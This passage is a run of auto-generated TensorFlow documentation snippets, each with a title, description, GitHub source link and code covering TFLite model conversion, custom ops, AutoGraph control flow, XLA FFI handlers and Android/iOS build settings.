  sess.run(tf.global_variables_initializer())

  # Convert the model.
  converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [img], [out])
  tflite_model = converter.convert()

  # Save the model.
  with open('model.tflite', 'wb') as f:
    f.write(tflite_model)
```

----------------------------------------

TITLE: Registering SimpleHashTableCreate Op - TensorFlow C++
DESCRIPTION: Registers a TensorFlow custom operation named "Examples>SimpleHashTableCreate". This op is responsible for creating an instance of the `SimpleHashTableResource` and outputting its resource handle. It requires `key_dtype` and `value_dtype` attributes to define the types of keys and values stored in the table. The `SetShapeFn(ScalarOutput)` indicates the output handle is a scalar.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_3

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>SimpleHashTableCreate")
    .Output("output: resource")
    .Attr("key_dtype: type")
    .Attr("value_dtype: type")
    .SetShapeFn(ScalarOutput);
```

----------------------------------------

TITLE: Converting TensorFlow Model to TFLite with Custom Ops (Python)
DESCRIPTION: Demonstrates the Python code required to convert a TensorFlow model into a TensorFlow Lite model using `tf.lite.TFLiteConverter`. It specifically shows setting `converter.allow_custom_ops = True` which is necessary to allow the conversion process when the model contains operations not supported by the default TFLite built-in library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_2

LANGUAGE: python
CODE:
```
converter = tf.lite.TFLiteConverter.from_concrete_functions([atan.get_concrete_function()], atan)
converter.allow_custom_ops = True
tflite_model = converter.convert()
```

----------------------------------------

TITLE: if Statement with tf.Tensor Condition - TensorFlow Python
DESCRIPTION: A Python `if` statement where the condition is a `tf.Tensor`. AutoGraph will automatically convert this statement into a `tf.cond` operation, allowing the conditional execution to be part of the TensorFlow graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_13

LANGUAGE: Python
CODE:
```
if tf.random.uniform(()) > 0.5:
  x = 1
else:
  x = 2
```

----------------------------------------

TITLE: Bazel Build Rule for External Delegate Library
DESCRIPTION: This Bazel `cc_binary` rule builds the external delegate adaptor code into a shared library (`.so` file). `linkshared = 1` creates a dynamic library, and `linkstatic = 1` links dependencies statically into the library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_7

LANGUAGE: Bazel
CODE:
```
cc_binary(
    name = "dummy_external_delegate.so",
    srcs = [
        "external_delegate_adaptor.cc",
    ],
    linkshared = 1,
    linkstatic = 1,
    deps = [
        ":dummy_delegate",
        "//tensorflow/lite/c:common",
        "//tensorflow/lite/tools:command_line_flags",
        "//tensorflow/lite/tools:logging",
    ],
)
```

----------------------------------------

TITLE: Computing Tensor Flat Size in Python (TFLite Support)
DESCRIPTION: This function signature shows the Python function `compute_flat_size` which takes an optional array of integers representing a tensor shape. It returns an integer representing the total number of elements (the product of the dimensions), or 0 if the input shape is None. It is part of the TFLite Support library's utility functions for metadata writers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/compute_flat_size.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.writer_utils.compute_flat_size(\n    tensor_shape: Optional[\'array.array[int]\']\n) -> int
```

----------------------------------------

TITLE: Executing TensorFlow Custom Op AsyncSleep Stack (Python)
DESCRIPTION: This snippet demonstrates how to call the `stack50` function with the asynchronous sleep op (`sleep_op.AsyncSleep`) and a specified delay. It shows the usage pattern for testing or using the asynchronous custom op, which is expected to exhibit different performance characteristics compared to its synchronous counterpart.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/sleep/README.md#_snippet_14

LANGUAGE: python
CODE:
```
  delay_seconds = 1.0
  stack50(sleep_op.AsyncSleep, delay_seconds)
```

----------------------------------------

TITLE: Initializing InputImageTensorMd | Python
DESCRIPTION: Initializes an `InputImageTensorMd` object with specified metadata for an input image tensor. Parameters include name, description, normalization mean and standard deviation, color space type, and tensor data type. Raises a `ValueError` if `norm_mean` and `norm_std` have different dimensions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/InputImageTensorMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.InputImageTensorMd(
    name: Optional[str] = None,
    description: Optional[str] = None,
    norm_mean: Optional[List[float]] = None,
    norm_std: Optional[List[float]] = None,
    color_space_type: Optional[<a href="../../../tflite_support/metadata_schema_py_generated/ColorSpaceType"><code>tflite_support.metadata_schema_py_generated.ColorSpaceType</code></a>] = _metadata_fb.ColorSpaceType.UNKNOWN,
    tensor_type: Optional[_schema_fb.TensorType] = None
)
```

----------------------------------------

TITLE: Using Custom TFLite AARs from Local Maven - Gradle
DESCRIPTION: This Gradle snippet configures project repositories to include `mavenLocal()` and specifies dependencies to use custom-built TensorFlow Lite AARs (standard and select TF ops) installed in the local Maven repository.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_5

LANGUAGE: build
CODE:
```
allprojects {
    repositories {
        mavenCentral()
        maven {  // Only for snapshot artifacts
            name 'ossrh-snapshot'
            url 'https://oss.sonatype.org/content/repositories/snapshots'
        }
        mavenLocal()
    }
}

dependencies {
    implementation 'org.tensorflow:tensorflow-lite:0.1.100'
    implementation 'org.tensorflow:tensorflow-lite-select-tf-ops:0.1.100'
}
```

----------------------------------------

TITLE: Binding XLA FFI Handler for Dimension and Type Constrained Buffers
DESCRIPTION: Shows how to create an XLA FFI handler that enforces both a specific data type (`F32`) and a specific number of dimensions (rank 2) for buffer arguments and results using `BufferR<Rank><T>`. The handler receives typed pointers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_4

LANGUAGE: C++
CODE:
```
// Buffers of number of dimensions 2 and F32 data type.
auto handler = Ffi::Bind().Arg<BufferR2<F32>>().Ret<BufferR2<F32>>().To(
    [](BufferR2<F32> arg, Result<BufferR2<F32>> res) -> Error {
      float* arg_data = arg.typed_data();
      float* res_data = res->typed_data();
      return Error::Success();
    });
```

----------------------------------------

TITLE: Evaluating TFLite Model (Python)
DESCRIPTION: Evaluates a TFLite model loaded from a specified file path using evaluation data. This is useful for assessing the performance of the quantized or converted model. Accepts an optional postprocessing function and returns the evaluation result, typically accuracy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_5

LANGUAGE: python
CODE:
```
evaluate_tflite(
    tflite_filepath, data, postprocess_fn=None
)
```

----------------------------------------

TITLE: Reordering TFLite Input Details in TensorFlow Lite
DESCRIPTION: Adjusts the order of input tensors in the TFLite interpreter details to match the expected order of inputs from the original Keras model. This is necessary for correct data feeding during TFLite inference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/BertQaSpec.md#_snippet_10

LANGUAGE: python
CODE:
```
reorder_input_details(
    tflite_input_details
)

```

----------------------------------------

TITLE: Using Python If with Static Shape Check Python
DESCRIPTION: Shows how to use a standard Python `if` statement with a static shape check (`x.shape[0]`) to conditionally access a tensor element. Since `x.shape` is known during tracing, the `if` is evaluated in Python, preventing the trace from including the invalid access `x[4]` if the condition is false.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_34

LANGUAGE: Python
CODE:
```
if x.shape[0] > 4:
  val = x[4]
else:
  val = some_default_value
```

----------------------------------------

TITLE: Evaluate TensorFlow Model (Python)
DESCRIPTION: Evaluates the trained TensorFlow model on the provided data. It calculates and returns performance metrics such as loss and accuracy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/AudioClassifier.md#_snippet_5

LANGUAGE: Python
CODE:
```
evaluate(
    data, batch_size=32
)
```

----------------------------------------

TITLE: Disabling Quantization for MetalDelegate (Objective-C)
DESCRIPTION: Shows the Objective-C code required to explicitly disable support for quantized models when initializing the `TFLMetalDelegateOptions` by setting `quantizationEnabled` to `false`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_10

LANGUAGE: Objective-C
CODE:
```
    TFLMetalDelegateOptions* options = [[TFLMetalDelegateOptions alloc] init];
    options.quantizationEnabled = false;
```

----------------------------------------

TITLE: Define JAX Resnet50 Wrapper Class Python
DESCRIPTION: This Python class `Resnet50Wrapper` wraps the Hugging Face `FlaxResNetForImageClassification` model within a `flax.linen.nn.Module`. This wrapper is created to make the model's input/output signature compatible with the requirements for export to TensorFlow Lite, specifically expecting a tensor or tuple of tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
import flax.linen as nn
from transformers import FlaxResNetForImageClassification


class Resnet50Wrapper(nn.Module):
  pretrained_model_name: str = "microsoft/resnet-50"  # Pre-trained model name

  def setup(self):
    # Initialize the pre-trained ResNet50 model
    self.model = FlaxResNetForImageClassification.from_pretrained(
        self.pretrained_model_name
    )

  def __call__(self, inputs):
    # Process input images through the Resnet50 model
    outputs = self.model(pixel_values=inputs)

    # Return logits or directly apply softmax for probabilities (optional)
    return outputs.logits
```

----------------------------------------

TITLE: Reading and Displaying Model Metadata (Python)
DESCRIPTION: Demonstrates how to read and display metadata and associated files embedded within a TFLite model. It initializes a `metadata.MetadataDisplayer` with the path to the metadata-populated model file. It then prints the complete metadata JSON structure using `get_metadata_json()` and iterates through any associated files, printing their names and content retrieved using `get_packed_associated_file_list()` and `get_associated_file_buffer()`, respectively.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_22

LANGUAGE: Python
CODE:
```
from tflite_support import metadata

displayer = metadata.MetadataDisplayer.with_model_file("mobilenet_v2_1.0_224_metadata.tflite")
print("Metadata populated:")
print(displayer.get_metadata_json())

print("Associated file(s) populated:")
for file_name in displayer.get_packed_associated_file_list():
  print("file name: ", file_name)
  print("file content:")
  print(displayer.get_associated_file_buffer(file_name))
```

----------------------------------------

TITLE: Creating TensorFlow Model with Custom Atan Operator (Python)
DESCRIPTION: Defines and trains a simple TensorFlow model that includes an operation named 'Atan', simulating an unsupported TensorFlow operation. The model calculates `y = atan(x + offset)` where 'offset' is a trainable variable. It uses `tf.optimizers.Adam` for training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Define training dataset and variables
x = [-8, 0.5, 2, 2.2, 201]
y = [-1.4288993, 0.98279375, 1.2490457, 1.2679114, 1.5658458]
offset = tf.Variable(0.0)

# Define a simple model which just contains a custom operator named `Atan`
@tf.function(input_signature=[tf.TensorSpec.from_tensor(tf.constant(x))])
def atan(x):
  return tf.atan(x + offset, name="Atan")

# Train model
optimizer = tf.optimizers.Adam(0.01)
def train(x, y):
    with tf.GradientTape() as t:
      predicted_y = atan(x)
      loss = tf.reduce_sum(tf.square(predicted_y - y))
    grads = t.gradient(loss, [offset])
    optimizer.apply_gradients(zip(grads, [offset]))

for i in range(1000):
    train(x, y)

print("The actual offset is: 1.0")
print("The predicted offset is:", offset.numpy())
```

----------------------------------------

TITLE: Python Variable Becomes Tensor in TF Control Flow - TensorFlow Python
DESCRIPTION: Shows how a Python integer variable `i` becomes a `tf.Tensor` after being potentially modified within an `if` statement that AutoGraph converts to a `tf.cond` (because the condition `tf.greater(i, 0)` involves a Tensor).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/control_flow.md#_snippet_12

LANGUAGE: Python
CODE:
```
i = 0
if tf.greater(i, 0):
  i = 1
# i is now a Tensor
```

----------------------------------------

TITLE: Converting ConcreteFunctions to TFLite Python
DESCRIPTION: Illustrates how to create a TFLiteConverter using a list of ConcreteFunctions and a related model object, then convert it to a TensorFlow Lite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_3

LANGUAGE: python
CODE:
```
# Converting ConcreteFunctions to a TensorFlow Lite model.
converter = tf.lite.TFLiteConverter.from_concrete_functions([func], model)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Implementing SimpleHashTableResource Class - C++
DESCRIPTION: Defines a thread-safe TensorFlow resource class (`SimpleHashTableResource`) derived from `ResourceBase`. It uses an `absl::flat_hash_map` to store key-value pairs and a mutex (`mu_`) for thread-safe access. It provides methods for inserting, finding, and removing elements, as well as exporting and importing the entire table state for `SavedModel` support. It also includes a `DebugString` method.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_2

LANGUAGE: C++
CODE:
```
template <class K, class V>
class SimpleHashTableResource : public ::tensorflow::ResourceBase {
 public:
  Status Insert(const Tensor& key, const Tensor& value) {
    const K key_val = key.flat<K>()(0);
    const V value_val = value.flat<V>()(0);

    mutex_lock l(mu_);
    table_[key_val] = value_val;
    return OkStatus();
  }

  Status Find(const Tensor& key, Tensor* value, const Tensor& default_value) {
    // Note that tf_shared_lock could be used instead of mutex_lock
    // in ops that do not not modify data protected by a mutex, but
    // go/totw/197 recommends using exclusive lock instead of a shared
    // lock when the lock is not going to be held for a significant amount
    // of time.
    mutex_lock l(mu_);

    const V default_val = default_value.flat<V>()(0);
    const K key_val = key.flat<K>()(0);
    auto value_val = value->flat<V>();
    value_val(0) = gtl::FindWithDefault(table_, key_val, default_val);
    return OkStatus();
  }

  Status Remove(const Tensor& key) {
    mutex_lock l(mu_);

    const K key_val = key.flat<K>()(0);
    if (table_.erase(key_val) != 1) {
      return errors::NotFound("Key for remove not found: ", key_val);
    }
    return OkStatus();
  }

  // Save all key, value pairs to tensor outputs to support SavedModel
  Status Export(OpKernelContext* ctx) {
    mutex_lock l(mu_);
    int64_t size = table_.size();
    Tensor* keys;
    Tensor* values;
    TF_RETURN_IF_ERROR(
        ctx->allocate_output("keys", TensorShape({size}), &keys));
    TF_RETURN_IF_ERROR(
        ctx->allocate_output("values", TensorShape({size}), &values));
    auto keys_data = keys->flat<K>();
    auto values_data = values->flat<V>();
    int64_t i = 0;
    for (auto it = table_.begin(); it != table_.end(); ++it, ++i) {
      keys_data(i) = it->first;
      values_data(i) = it->second;
    }
    return OkStatus();
  }

  // Load all key, value pairs from tensor inputs to support SavedModel
  Status Import(const Tensor& keys, const Tensor& values) {
    const auto key_values = keys.flat<K>();
    const auto value_values = values.flat<V>();

    mutex_lock l(mu_);
    table_.clear();
    for (int64_t i = 0; i < key_values.size(); ++i) {
      gtl::InsertOrUpdate(&table_, key_values(i), value_values(i));
    }
    return OkStatus();
  }

  // Create a debug string with the content of the map if this is small,
  // or some example data if this is large, handling both the cases where the
  // hash table has many entries and where the entries are long strings.
  std::string DebugString() const override { return DebugString(3); }
  std::string DebugString(int num_pairs) const {
    std::string rval = "SimpleHashTable {";
    size_t count = 0;
    const size_t max_kv_str_len = 100;
    mutex_lock l(mu_);
    for (const auto& pair : table_) {
      if (count >= num_pairs) {
        strings::StrAppend(&rval, "...");
        break;
      }
      std::string kv_str = strings::StrCat(pair.first, ": ", pair.second);
      strings::StrAppend(&rval, kv_str.substr(0, max_kv_str_len));
      if (kv_str.length() > max_kv_str_len) strings::StrAppend(&rval, " ...");
      strings::StrAppend(&rval, ", ");
      count += 1;
    }
    strings::StrAppend(&rval, "}");
    return rval;
  }

 private:
  mutable mutex mu_;
  absl::flat_hash_map<K, V> table_ TF_GUARDED_BY(mu_);
};
```

----------------------------------------

TITLE: Running TensorFlow Custom Op Tests Bazel Shell
DESCRIPTION: Executes the test suite for the `multiplex_4` custom TensorFlow op using the Bazel build system. This command triggers the compilation and execution of the tests defined by the `tf_py_test` rule for the specified target path. Requires Bazel configured for the TensorFlow source tree and the necessary BUILD rules.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_4/README.md#_snippet_7

LANGUAGE: Shell
CODE:
```
bazel test //third_party/tensorflow/google/g3doc/example/multiplex_4:multiplex_4_test
```

----------------------------------------

TITLE: Add Derived Metrics to Debugger Statistics Pandas
DESCRIPTION: Computes the 'range' (255 * scale) and 'rmse/scale' (sqrt(mean_squared_error) / scale) metrics from the loaded layer statistics and adds them as new columns to the pandas DataFrame. These derived metrics aid in identifying problematic layers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_11

LANGUAGE: Python
CODE:
```
layer_stats['range'] = 255.0 * layer_stats['scale']
layer_stats['rmse/scale'] = layer_stats.apply(
    lambda row: np.sqrt(row['mean_squared_error']) / row['scale'], axis=1)
layer_stats[['op_name', 'range', 'rmse/scale']].head()
```

----------------------------------------

TITLE: Creating TFLite Audio Classifier MetadataWriter from Info Objects (Python)
DESCRIPTION: This class method creates a `MetadataWriter` for an audio classifier model based on structured metadata information objects (`GeneralMd`, `InputAudioTensorMd`, `ClassificationTensorMd`). It takes the model buffer and optional info objects, generating default metadata if not provided, and returns a `MetadataWriter`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/MetadataWriter.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata_info(
    model_buffer: bytearray,
    general_md: Optional[tflite_support.metadata_writers.metadata_info.GeneralMd] = None,
    input_md: Optional[tflite_support.metadata_writers.metadata_info.InputAudioTensorMd] = None,
    output_md: Optional[tflite_support.metadata_writers.metadata_info.ClassificationTensorMd] = None
)
```

----------------------------------------

TITLE: Initializing Searcher Class - TFLite Model Maker - Python
DESCRIPTION: Initializes a `Searcher` instance using a pre-built ScaNN index and associated metadata. Requires paths to the ScaNN artifacts directory (`serialized_scann_path`) and optional TFLite embedder model (`embedder_path`), along with a list of metadata (`metadata`) corresponding to the embeddings in the same order as in ScaNN.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/searcher/Searcher.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.searcher.Searcher(
    serialized_scann_path: str,
    metadata: List[AnyStr],
    embedder_path: Optional[str] = None
) -> None
```

----------------------------------------

TITLE: Configuring Task API ObjectDetector Options Conditionally (Kotlin)
DESCRIPTION: This snippet shows how to continue from the GPU availability check task (`useGpuTask`) to configure `ObjectDetectorOptions`. It conditionally enables GPU support via `baseOptionsBuilder.useGpu()` based on the task result.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_14

LANGUAGE: Kotlin
CODE:
```
lateinit val optionsTask = useGpuTask.continueWith { task ->
  val baseOptionsBuilder = BaseOptions.builder()
  if (task.result) {
    baseOptionsBuilder.useGpu()
  }
 ObjectDetectorOptions.builder()
          .setBaseOptions(baseOptionsBuilder.build())
          .setMaxResults(1)
          .build()
}
```

----------------------------------------

TITLE: Initializing MobileBert QA Spec in Python
DESCRIPTION: This code snippet shows the constructor signature for the `MobileBertQaSpec` class in TFLite Model Maker. It's used to define the configuration for a MobileBert model intended for question answering, specifying parameters like the TF-Hub URI, sequence lengths, learning rate, dropout, and hardware distribution settings.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/MobileBertQaSpec.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.question_answer.MobileBertQaSpec(
    *,
    uri='https://tfhub.dev/google/mobilebert/uncased_L-24_H-128_B-512_A-4_F-4_OPT/1',
    model_dir=None,
    seq_len=384,
    query_len=64,
    doc_stride=128,
    dropout_rate=0.1,
    initializer_range=0.02,
    learning_rate=4e-05,
    distribution_strategy='off',
    num_gpus=-1,
    tpu='',
    trainable=True,
    predict_batch_size=8,
    do_lower_case=True,
    is_tf2=False,
    tflite_input_name=None,
    tflite_output_name=None,
    init_from_squad_model=False,
    default_batch_size=32,
    name='MobileBert'
)
```

----------------------------------------

TITLE: Parsing TFLite AssociatedFile from Buffer (Python)
DESCRIPTION: Parses and returns the root `AssociatedFile` object from a flatbuffer buffer (`buf`). This class method allows accessing the object starting from a specified `offset` within the buffer. It returns an initialized instance of the `AssociatedFile` class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Raising Exception on TFLite Incompatibility Python
DESCRIPTION: Demonstrates using the `raise_exception=True` option within the `@tf.lite.experimental.authoring.compatible` decorator. When this option is set, evaluating the decorated function will immediately raise an exception if any TFLite incompatibility is found, enforcing stricter compliance during development. The example uses a try-except block to handle the expected exception.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
@tf.lite.experimental.authoring.compatible(raise_exception=True)
@tf.function(input_signature=[
 tf.TensorSpec(shape=[None], dtype=tf.float32)
])
def f(x):
 return tf.cosh(x)

# Evaluate the tf.function
try:
 result = f(tf.constant([0.0]))
 print (f"result = {result}")
except Exception as e:
 print(f"Got an exception: {e}")
```

----------------------------------------

TITLE: Example Using DynamicSlice on 1D Array
DESCRIPTION: This pseudocode demonstrates the XLA DynamicSlice operation on a 1-dimensional array. It shows how to extract a sub-array starting at a dynamic index (specified by 's') with a fixed size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_17

LANGUAGE: pseudocode
CODE:
```
let a = {0.0, 1.0, 2.0, 3.0, 4.0}
let s = {2}

DynamicSlice(a, s, {2}) produces:
{2.0, 3.0}
```

----------------------------------------

TITLE: Executing tf.function Without Eager (Python)
DESCRIPTION: This snippet calls the TensorFlow function `f` with a constant input `1`. When executed without eager mode explicitly enabled, the debugger will land inside the AutoGraph-generated code during the tracing phase, as shown in the subsequent output snippet.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/debugging.md#_snippet_1

LANGUAGE: python
CODE:
```
f(1)
```

----------------------------------------

TITLE: Using Extended TensorFlow Multiplex Op (Python)
DESCRIPTION: This Python snippet shows how to use the 'multiplex_2_op.multiplex' function after importing the 'multiplex_3_op'. By importing 'multiplex_3_op', the dispatch mechanism registers the sparse tensor handler, allowing the original 'multiplex' function to correctly process 'tf.SparseTensor' inputs using the new kernel. It constructs example sparse tensors for 'cond', 'a', and 'b' and calls the 'multiplex' function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_3/README.md#_snippet_11

LANGUAGE: Python
CODE:
```
import tensorflow as tf

from tensorflow.examples.custom_ops_doc.multiplex_2 import multiplex_2_op
from tensorflow.examples.custom_ops_doc.multiplex_3 import multiplex_3_op

cond = tf.SparseTensor(indices=[[1], [3], [6]],
                    values=[True, False, True], dense_shape=[7])
a = tf.SparseTensor(indices=[[1], [3], [5]],
                    values=['a0', 'a1', 'a2'], dense_shape=[6])
b = tf.SparseTensor(indices=[[0], [2], [3], [6]],
                    values=['b0', 'b1', 'b2', 'b3'], dense_shape=[7])
result = multiplex_2_op.multiplex(cond, a, b)
```

----------------------------------------

TITLE: Installing Prerequisites Python
DESCRIPTION: Installs necessary system packages (libportaudio2) and the tflite-model-maker Python library using apt and pip respectively. These are required to run the Model Maker code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
!sudo apt -y install libportaudio2
!pip install -q tflite-model-maker
```

----------------------------------------

TITLE: Adding Linker Flag for Select TF Ops (CocoaPods >= 2.9.0) - Text
DESCRIPTION: This text snippet provides the required `-force_load` linker flag setting for Xcode project build settings when using the `TensorFlowLiteSelectTfOps` CocoaPod version 2.9.0 or later, ensuring the necessary library is loaded at runtime.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_7

LANGUAGE: text
CODE:
```
-force_load $(SRCROOT)/Pods/TensorFlowLiteSelectTfOps/Frameworks/TensorFlowLiteSelectTfOps.xcframework/ios-arm64/TensorFlowLiteSelectTfOps.framework/TensorFlowLiteSelectTfOps
```

----------------------------------------

TITLE: Enforcing Execution Order with Control Dependencies (Python)
DESCRIPTION: This snippet demonstrates how `tf.control_dependencies` can be used in Python to explicitly enforce execution order. Here, `variable.assign(1.0)` is made dependent on the result of `tf.matmul(x, y)`, ensuring the assignment happens only after the matmul operation completes. The text notes that this specific pattern couldn't be correctly modeled in the previous TensorFlow dialect in MLIR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/README.md#_snippet_2

LANGUAGE: Python
CODE:
```
@tf.function
def foo(x, y, variable):
   b = tf.matmul(x, y)
   with tf.control_dependencies([b]):
     variable.assign(1.0)
   return b
```

----------------------------------------

TITLE: Call TFLite JNI Methods After Initialization
DESCRIPTION: Demonstrates how to call the native TFLite methods (`loadModel`) from Java or Kotlin code using the `TfLiteJni` class instance after the asynchronous TFLite runtime initialization task has completed successfully.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/native.md#_snippet_6

LANGUAGE: Java
CODE:
```
tfLiteHandleTask.onSuccessTask(unused -> {
    TfLiteJni jni = new TfLiteJni();
    jni.loadModel(getAssets(), "add.bin");
    //...
});
```

LANGUAGE: Kotlin
CODE:
```
tfLiteHandleTask.onSuccessTask {
    val jni = TfLiteJni()
    jni.loadModel(assets, "add.bin")
    // ...
}
```

----------------------------------------

TITLE: Getting TFLite Metadata as JSON in Python
DESCRIPTION: Defines the method signature for `get_metadata_json`. This method converts the model's metadata into a JSON formatted string for easier parsing and display. It returns the metadata as a string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataDisplayer.md#_snippet_3

LANGUAGE: python
CODE:
```
get_metadata_json()
```

----------------------------------------

TITLE: Install TensorFlow Android Demo ADB Bash
DESCRIPTION: This command uses the Android Debug Bridge (ADB) to install the compiled `tensorflow_demo.apk` onto a connected Android device or emulator. The `-r` flag ensures that the application is reinstalled, preserving application data if it already exists. This step requires ADB to be installed and the target device to have USB debugging enabled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/android/test/README.md#_snippet_4

LANGUAGE: bash
CODE:
```
adb install -r bazel-bin/tensorflow/tools/android/test/tensorflow_demo.apk
```

----------------------------------------

TITLE: Running Script to Download Benchmark Models
DESCRIPTION: This command executes a shell script named `download_models.sh`. This script is designed to fetch and download various popular TensorFlow model graph files required for benchmarking.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_6

LANGUAGE: Bash
CODE:
```
bash download_models.sh
```

----------------------------------------

TITLE: Accessing Static Python Dictionary with Functional Style Python
DESCRIPTION: Shows the correct, functional programming style approach to handle the previous scenario. Instead of modifying the dictionary in place with a dynamic key, a new dictionary is created in each iteration using a dictionary comprehension, which is compatible with graph execution. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_32

LANGUAGE: Python
CODE:
```
d = {'a': tf.constant(3)}
for i in tf.range(10):
  d = {key: value + i for key, value in d.items()}  # Okay
```

----------------------------------------

TITLE: Modifying Static Python Dictionary Value in Control Flow Python
DESCRIPTION: Shows that modifying a value in a Python dictionary is allowed inside control flow if the dictionary's structure (keys) is static. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_30

LANGUAGE: Python
CODE:
```
static_dict = {'field': tf.constant(3)}
while static_dict['field'] > 0:
  static_dict['field'] -= 1  # Okay -- static_dict does not change structure
```

----------------------------------------

TITLE: Including Core ML Delegate Header (Objective-C++)
DESCRIPTION: Shows the necessary include directive to use the Core ML delegate functions in Objective-C++ or C++ code. This header provides the C API definitions for delegate creation and deletion.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/coreml/README.md#_snippet_1

LANGUAGE: Objective-C++
CODE:
```
#include "tensorflow/lite/experimental/delegates/coreml/coreml_delegate.h"
```

----------------------------------------

TITLE: Initializing TFLite Model Maker Image DataLoader
DESCRIPTION: Initializes a DataLoader instance for image classification. It takes a tf.data.Dataset object, its size, and a mapping from index to label.

Args:
  dataset: A tf.data.Dataset object containing (input_data, target) pairs.
  size: The size of the dataset.
  index_to_label: A mapping from integer indices to class labels.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/DataLoader.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_model_maker.image_classifier.DataLoader(
    dataset, size, index_to_label
)
```

----------------------------------------

TITLE: Viewing Code Memory Attribution with TFProf
